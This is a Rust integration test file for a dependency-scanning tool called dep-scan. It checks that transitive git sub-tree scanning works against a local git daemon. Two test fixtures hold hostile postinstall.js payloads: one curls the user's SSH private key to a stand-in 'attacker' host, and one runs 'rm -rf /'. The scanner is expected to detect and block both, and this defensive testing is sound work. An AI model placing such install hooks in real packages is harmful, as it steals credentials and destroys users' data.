//! End-to-end integration tests for the transitive scan path wiring (task 108,
//! ADR 009 capstone).
//!
//! Every test here is **zero external network** (REQ-108-08 / T-108-01): the only
//! fetches are git sub-tree fetches served by a `git daemon` bound to
//! `git://127.0.0.1:<ephemeral>` over loopback. Registry URLs point at
//! `127.0.0.1:1` (the OS refuses immediately) and all registry policies are off,
//! so no public host is ever contacted.
//!
//! Covered:
//!   - T-108-02 byte-for-byte non-regression when `[transitive] enabled = false`.
//!   - T-108-04 (binary half) a malicious git sub-tree blocks the scan (exit 1)
//!     and is named in the output — the transitive scan path is the live one.
//!   - T-108-13 `--transitive` triggers the walk even with config enabled=false.
//!   - T-108-14 `--no-transitive` suppresses the walk even with config enabled=true.

use std::io::Write as _;
use std::net::{TcpListener, TcpStream};
use std::path::Path;
use std::process::{Child, Command as StdCommand, Stdio};
use std::time::Duration;

use assert_cmd::Command;
use tempfile::TempDir;

fn dep_scan() -> Command {
    Command::cargo_bin("dep-scan").expect("dep-scan binary must exist")
}

fn git_available() -> bool {
    StdCommand::new("git")
        .arg("--version")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn run_git(dir: &Path, args: &[&str]) {
    let status = StdCommand::new("git")
        .args(args)
        .current_dir(dir)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("HOME", dir)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@example.com")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@example.com")
        .output()
        .unwrap_or_else(|e| panic!("git {args:?} failed to spawn: {e}"));
    assert!(
        status.status.success(),
        "git {args:?} failed: {}",
        String::from_utf8_lossy(&status.stderr)
    );
}

fn run_git_capture(dir: &Path, args: &[&str]) -> String {
    let out = StdCommand::new("git")
        .args(args)
        .current_dir(dir)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("HOME", dir)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@example.com")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@example.com")
        .output()
        .unwrap_or_else(|e| panic!("git {args:?} failed to spawn: {e}"));
    assert!(out.status.success(), "git {args:?} failed");
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

struct GitDaemon {
    child: Child,
    port: u16,
}
impl GitDaemon {
    fn start(base: &Path) -> Option<Self> {
        let port = TcpListener::bind("127.0.0.1:0")
            .ok()?
            .local_addr()
            .ok()?
            .port();
        let child = StdCommand::new("git")
            .args([
                "daemon",
                "--reuseaddr",
                "--listen=127.0.0.1",
                &format!("--port={port}"),
                &format!("--base-path={}", base.display()),
                "--export-all",
                "--informative-errors",
            ])
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .env("HOME", base)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .ok()?;
        let daemon = GitDaemon { child, port };
        for _ in 0..100 {
            if TcpStream::connect(("127.0.0.1", port)).is_ok() {
                return Some(daemon);
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        None
    }
    fn url(&self, repo: &str) -> String {
        format!("git://127.0.0.1:{}/{repo}", self.port)
    }
}
impl Drop for GitDaemon {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

/// Build a repo containing `files`, serve it over a local daemon, return
/// `(owning_tempdir, daemon, url, head_sha)`.
fn build_served_repo(files: &[(&str, &[u8])]) -> Option<(TempDir, GitDaemon, String, String)> {
    let dir = tempfile::tempdir().unwrap();
    let repo = dir.path().join("malicious-subtree");
    std::fs::create_dir(&repo).unwrap();
    run_git(&repo, &["init", "-q", "-b", "main"]);
    for (rel, content) in files {
        std::fs::write(repo.join(rel), content).unwrap();
    }
    run_git(&repo, &["add", "-A"]);
    run_git(&repo, &["commit", "-q", "-m", "init"]);
    let head = run_git_capture(&repo, &["rev-parse", "HEAD"]);
    let daemon = GitDaemon::start(dir.path())?;
    let url = daemon.url("malicious-subtree");
    Some((dir, daemon, url, head))
}

/// Write a dep-scan config. `transitive_block` is appended verbatim (may be "").
/// All registry URLs are dead (127.0.0.1:1); install-script detection is ON so a
/// malicious `postinstall.js` in a fetched git tree is detected.
fn write_config(cache_path: &str, transitive_block: &str) -> tempfile::NamedTempFile {
    let dead = "http://127.0.0.1:1";
    let mut f = tempfile::NamedTempFile::new().expect("create temp config");
    writeln!(
        f,
        r#"min_package_age_hours = 0
cache_path = "{cache_path}"

[registries]
npm_url = "{dead}"
pypi_url = "{dead}"
crates_url = "{dead}"
go_proxy_url = "{dead}"
go_sum_db_url = "{dead}"

[policies]
check_min_age = false
check_install_scripts = true
check_maintainer_changes = false
check_typosquatting = false
check_vulnerabilities = false
check_obfuscation = false
check_npm_provenance = false
check_pypi_provenance = false
check_go_sumdb = false

[osv]
osv_url = "{dead}"

[dependency_confusion]
internal_prefixes = []

[popularity]
min_downloads = 0

[vcs]
fetch_timeout_secs = 5
{transitive_block}"#
    )
    .expect("write temp config");
    f
}

/// A Cargo.lock with a single git-sourced dependency pinned to `sha`, fetched
/// from `url`. (Cargo.lock so the scan never touches any registry.)
fn git_dep_cargo_lock(url: &str, sha: &str) -> String {
    format!(
        r#"# This file is automatically @generated by Cargo.
version = 3

[[package]]
name = "malicious-subtree"
version = "0.1.0"
source = "git+{url}#{sha}"
"#
    )
}

// ---------------------------------------------------------------------------
// T-108-02: enabled=false is byte-for-byte identical to no [transitive] block.
// ---------------------------------------------------------------------------
#[test]
fn t108_02_enabled_false_is_byte_for_byte_non_regression() {
    // T-108-02 / T-108-01: offline, no daemon needed — the git host is allowed
    // but unreachable (port 1), so the dep fails closed identically in both runs.
    let tmp_a = TempDir::new().unwrap();
    let tmp_b = TempDir::new().unwrap();
    let cache_a = tmp_a.path().join("c.db");
    let cache_b = tmp_b.path().join("c.db");

    // Scan A: no [transitive] block. Scan B: [transitive] enabled = false.
    let cfg_a = write_config(cache_a.to_str().unwrap(), "");
    let cfg_b = write_config(cache_b.to_str().unwrap(), "[transitive]\nenabled = false\n");

    let lock = git_dep_cargo_lock(
        "git://127.0.0.1:1/repo",
        "abcdef1234567890abcdef1234567890abcdef12",
    );
    let lock_a = tmp_a.path().join("Cargo.lock");
    let lock_b = tmp_b.path().join("Cargo.lock");
    std::fs::write(&lock_a, &lock).unwrap();
    std::fs::write(&lock_b, &lock).unwrap();

    let out_a = dep_scan()
        .args([
            "--config",
            cfg_a.path().to_str().unwrap(),
            "check",
            "--lockfile",
            lock_a.to_str().unwrap(),
            "--lockfile-type",
            "crates",
            "--format",
            "native",
        ])
        .output()
        .expect("scan A runs");
    let out_b = dep_scan()
        .args([
            "--config",
            cfg_b.path().to_str().unwrap(),
            "check",
            "--lockfile",
            lock_b.to_str().unwrap(),
            "--lockfile-type",
            "crates",
            "--format",
            "native",
        ])
        .output()
        .expect("scan B runs");

    assert_eq!(
        out_a.status.code(),
        out_b.status.code(),
        "T-108-02: exit codes must match"
    );
    assert_eq!(
        String::from_utf8_lossy(&out_a.stdout),
        String::from_utf8_lossy(&out_b.stdout),
        "T-108-02: stdout must be byte-for-byte identical when transitive is disabled"
    );
    assert!(
        !out_a.stdout.is_empty(),
        "T-108-02: output must be non-empty (scan actually ran)"
    );
}

// ---------------------------------------------------------------------------
// T-108-04 (binary half): a malicious git sub-tree blocks the scan and is named.
// ---------------------------------------------------------------------------
#[test]
fn t108_04_malicious_git_subtree_blocks_and_is_named() {
    if !git_available() {
        eprintln!("skip T-108-04: git CLI not available");
        return;
    }
    // The git sub-tree carries a malicious postinstall script: the install-script
    // policy flags it as Block when the tree is fetched + scanned.
    let Some((_dir, _daemon, url, head)) = build_served_repo(&[
        ("package.json", br#"{"name":"malicious-subtree"}"# as &[u8]),
        // The install-hook file itself carries the payload — the install-script
        // policy scans files named pre/post/install.* (is_install_hook_path) and
        // flags `child_process` as Block (task 012 patterns).
        (
            "postinstall.js",
            b"require('child_process').exec('curl http://attacker/$(cat ~/.ssh/id_rsa)')",
        ),
    ]) else {
        eprintln!("skip T-108-04: could not start local git daemon");
        return;
    };

    let tmp = TempDir::new().unwrap();
    let cache = tmp.path().join("c.db");
    // Transitive scanning ENABLED.
    let cfg = write_config(cache.to_str().unwrap(), "[transitive]\nenabled = true\n");
    let lock = git_dep_cargo_lock(&url, &head);
    let lockfile = tmp.path().join("Cargo.lock");
    std::fs::write(&lockfile, &lock).unwrap();

    let out = dep_scan()
        .args([
            "--config",
            cfg.path().to_str().unwrap(),
            "check",
            "--lockfile",
            lockfile.to_str().unwrap(),
            "--lockfile-type",
            "crates",
            "--format",
            "native",
        ])
        .output()
        .expect("T-108-04: scan runs");

    let stdout = String::from_utf8_lossy(&out.stdout);
    // Exit 1 (Block) — a malicious git sub-tree on the transitive scan path
    // cannot pass (REQ-108-02, fail-closed).
    assert_eq!(
        out.status.code(),
        Some(1),
        "T-108-04: a malicious git sub-tree must produce exit 1 (Block).\nstdout:\n{stdout}"
    );
    // The output names the malicious sub-tree as the source.
    assert!(
        stdout.contains("malicious-subtree"),
        "T-108-04: output must name the malicious sub-tree:\n{stdout}"
    );
}

// ---------------------------------------------------------------------------
// T-108-13: --transitive triggers the walk even when config has enabled=false.
// T-108-14: --no-transitive suppresses the walk even when config has enabled=true.
// ---------------------------------------------------------------------------
#[test]
fn t108_13_14_cli_flags_override_config() {
    if !git_available() {
        eprintln!("skip T-108-13/14: git CLI not available");
        return;
    }
    let Some((_dir, _daemon, url, head)) = build_served_repo(&[
        ("package.json", br#"{"name":"malicious-subtree"}"# as &[u8]),
        (
            "postinstall.js",
            b"require('child_process').exec('rm -rf /')",
        ),
    ]) else {
        eprintln!("skip T-108-13/14: could not start local git daemon");
        return;
    };

    let lock = git_dep_cargo_lock(&url, &head);

    // T-108-13: config enabled=false, but --transitive forces the walk. The
    // transitive scan path runs and surfaces the transitive section, so the
    // output differs from the flat scan.
    let tmp13 = TempDir::new().unwrap();
    let cfg13 = write_config(
        tmp13.path().join("c.db").to_str().unwrap(),
        "[transitive]\nenabled = false\n",
    );
    let lock13 = tmp13.path().join("Cargo.lock");
    std::fs::write(&lock13, &lock).unwrap();
    let out_flag_on = dep_scan()
        .args([
            "--config",
            cfg13.path().to_str().unwrap(),
            "check",
            "--lockfile",
            lock13.to_str().unwrap(),
            "--lockfile-type",
            "crates",
            "--format",
            "native",
            "--transitive",
        ])
        .output()
        .expect("T-108-13: --transitive run");
    let stdout_on = String::from_utf8_lossy(&out_flag_on.stdout);
    assert!(
        stdout_on.contains("Transitive scan:"),
        "T-108-13: --transitive must trigger the transitive walk (config enabled=false):\n{stdout_on}"
    );

    // T-108-14: config enabled=true, but --no-transitive suppresses the walk. The
    // output has NO transitive section.
    let tmp14 = TempDir::new().unwrap();
    let cfg14 = write_config(
        tmp14.path().join("c.db").to_str().unwrap(),
        "[transitive]\nenabled = true\n",
    );
    let lock14 = tmp14.path().join("Cargo.lock");
    std::fs::write(&lock14, &lock).unwrap();
    let out_flag_off = dep_scan()
        .args([
            "--config",
            cfg14.path().to_str().unwrap(),
            "check",
            "--lockfile",
            lock14.to_str().unwrap(),
            "--lockfile-type",
            "crates",
            "--format",
            "native",
            "--no-transitive",
        ])
        .output()
        .expect("T-108-14: --no-transitive run");
    let stdout_off = String::from_utf8_lossy(&out_flag_off.stdout);
    assert!(
        !stdout_off.contains("Transitive scan:"),
        "T-108-14: --no-transitive must suppress the transitive walk (config enabled=true):\n{stdout_off}"
    );
}

// ---------------------------------------------------------------------------
// T-108-11: --format json with transitive enabled is valid JSON carrying the
// transitive section.
// ---------------------------------------------------------------------------
#[test]
fn t108_11_json_output_is_valid_with_transitive_section() {
    if !git_available() {
        eprintln!("skip T-108-11: git CLI not available");
        return;
    }
    let Some((_dir, _daemon, url, head)) =
        build_served_repo(&[("package.json", br#"{"name":"clean-subtree"}"# as &[u8])])
    else {
        eprintln!("skip T-108-11: could not start local git daemon");
        return;
    };

    let tmp = TempDir::new().unwrap();
    let cfg = write_config(
        tmp.path().join("c.db").to_str().unwrap(),
        "[transitive]\nenabled = true\n",
    );
    let lock = git_dep_cargo_lock(&url, &head);
    let lockfile = tmp.path().join("Cargo.lock");
    std::fs::write(&lockfile, &lock).unwrap();

    let out = dep_scan()
        .args([
            "--config",
            cfg.path().to_str().unwrap(),
            "check",
            "--lockfile",
            lockfile.to_str().unwrap(),
            "--lockfile-type",
            "crates",
            "--format",
            "json",
        ])
        .output()
        .expect("T-108-11: json run");
    let stdout = String::from_utf8_lossy(&out.stdout);
    // Parses as valid JSON with no trailing garbage.
    let parsed: serde_json::Value =
        serde_json::from_str(stdout.trim()).expect("T-108-11: output must be valid JSON");
    assert!(
        parsed.get("transitive").is_some(),
        "T-108-11: JSON must carry the transitive section: {stdout}"
    );
    assert!(
        parsed.get("results").is_some(),
        "T-108-11: JSON must still carry the flat results: {stdout}"
    );
}
